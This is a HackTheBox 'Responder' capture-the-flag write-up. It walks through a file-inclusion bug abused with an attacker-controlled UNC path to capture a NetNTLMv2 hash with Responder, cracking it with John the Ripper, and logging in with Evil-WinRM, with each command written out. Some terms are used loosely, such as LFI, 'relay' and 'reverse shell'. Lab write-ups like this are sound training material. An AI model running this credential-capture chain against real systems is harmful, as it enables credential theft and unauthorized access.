# 🧠 Responder – HTB Starting Point Write-Up  
**Author:** dotguy  
**Tier:** 1  
**Category:** Windows, LFI, Responder, NetNTLMv2, Password Cracking, Evil-WinRM  

---

## 🗒️ Introduction  
Windows remains the dominant OS in enterprise environments, often configured with Active Directory and legacy authentication protocols like NTLM.  
This box demonstrates how a **File Inclusion vulnerability** can be abused to capture a **NetNTLMv2 challenge** via `Responder`, then crack it using `JohnTheRipper` to gain a shell with **Evil-WinRM**.

---

## 🔍 Enumeration  

Performed an Nmap scan:

```bash
nmap -sC -sV -Pn -p- 10.129.X.X
```

![nmap result](./HTB_THINGY/nmap_result.png)

Discovered:
- Port 80 (HTTP)
- Possible web app hosted

Visited the site: **Unika**

![Unika site](./images/2-unika.png)

---

## 📤 LFI Discovery  

Found an input field that takes strings:

![String input](./images/3-string-input.png)

Tested for LFI using:

```http
\\10.10.14.X\share
```

![LFI string input](./images/4-lfi-input.png)

Confirmed inclusion leads to outbound request from server — ✅ **vulnerable to LFI**.

---

## 🧪 Responder Setup  

Started `Responder` on local machine:

```bash
sudo responder -I tun0
```

![Responder started](./images/5-responder-init.png)

Then configured the parameter to call our malicious SMB path:

![Setting page param](./images/6-setting-param.png)

---

## 🪝 NTLMv2 Hash Captured  

Boom — captured a **NetNTLMv2 hash** for user `admin`.

![Hash captured](./images/7-netntlm-admin.png)

Saved the hash to a file: `hash.txt`

---

## 🔓 Cracking the Hash  

Used `JohnTheRipper` with the rockyou wordlist:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Cracked password: **badminton**

![Password cracked](./images/8-password-badminton.png)

---

## 🩸 Shell Access – Evil-WinRM  

Logged in using Evil-WinRM:

```bash
evil-winrm -i 10.129.X.X -u admin -p badminton
```

![Evil-WinRM shell](./images/9-evil-winrm.png)

Listed directories and found the flag:

```bash
dir
type flag.txt
```

![Flag directory](./images/10-dir-flag.png)  
![Flag content](./images/11-flag-found.png)

---

## 🔚 What I Learned  

- How NTLMv2 works and why it's still dangerous when combined with LFI  
- Using `Responder` to capture hashes  
- Cracking hashes with `john`  
- Practical use of `Evil-WinRM` to get reverse shells on Windows targets  

---

## 🧰 Tools Used  
- Nmap  
- Responder  
- JohnTheRipper  
- Evil-WinRM  
- Burp Suite  
- Browser

---

## ✅ Final Thoughts  

Even though this was a Starting Point machine, the attack chain reflects a **real-world vuln combo** (LFI ➝ SMB relay ➝ NTLMv2 ➝ cracked creds ➝ WinRM shell). This box reinforces how outdated configurations can still lead to pwnage 💀.

---

**🔗 Connect with me on LinkedIn & check more writeups:**  
[github.com/yourusername](https://github.com/yourusername)
